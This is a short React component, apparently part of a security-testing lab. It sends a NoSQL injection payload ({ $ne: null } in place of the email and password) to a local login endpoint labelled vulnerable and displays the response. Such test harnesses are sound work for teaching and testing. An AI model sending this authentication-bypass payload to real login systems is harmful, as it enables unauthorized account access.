import React, { useState } from 'react';
import axios from 'axios';

const AuthBypassTest = () => {
  const [testResult, setTestResult] = useState(null);

  const handleTest = async () => {
    try {
      const response = await axios.post('http://localhost:8800/v1/login-vulnerable-1', {
        email: { $ne: null },
        password: { $ne: null }
      });
      setTestResult(JSON.stringify(response.data, null, 2));
    } catch (err) {
      setTestResult(JSON.stringify(err.response?.data || err.message, null, 2));
    }
  };

  return (
    <div className="testing-panel">
      <h2>Authentication Bypass Test</h2>
      <button onClick={handleTest} className="test-button">Run Test</button>
      {testResult && <pre className="result-display">{testResult}</pre>}
    </div>
  );
};

export default AuthBypassTest;